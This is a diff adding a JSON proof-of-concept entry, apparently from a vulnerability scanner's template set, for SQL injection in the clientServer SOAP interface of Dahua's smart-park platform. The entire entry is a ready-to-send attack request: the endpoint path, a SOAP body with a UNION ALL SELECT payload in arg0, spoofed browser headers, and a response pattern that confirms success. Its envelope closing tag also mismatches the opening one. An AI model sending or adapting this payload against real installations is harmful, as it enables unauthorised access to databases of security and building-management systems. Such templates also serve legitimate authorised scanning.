@@ -1,0 +1,15 @@
+{
+	"name":"大华智慧园区clientServer接口SQL注入",
+	"tag":"dahua",
+	"type":"other",
+	"poc":{
+		"pocGet":"/portal/services/clientServer",
+		"pocPost":"<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:cli=\"http://clientServer.webservice.dssc.dahua.com\">\r\n  <soapenv:Header/>\r\n  <soapenv:Body>\r\n  <cli:getGroupInfoListByGroupId>\r\n    <!--type: string-->\r\n      <arg0>-5398) UNION ALL SELECT 5336,5336,5336,5336,md5(123456)-- -</arg0>\r\n    <!--type: long-->\r\n    <arg1>10</arg1>\r\n    </cli:getGroupInfoListByGroupId>\r\n    </soapenv:Body>\r\n  </soap:Envelope>",
+		"header":{
+			"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
+			"Content-Type":" text/xml;charset=UTF-8"
+		},
+		"status_code":"200",
+		"pattern":"(groupdetail)"
+	}
+}
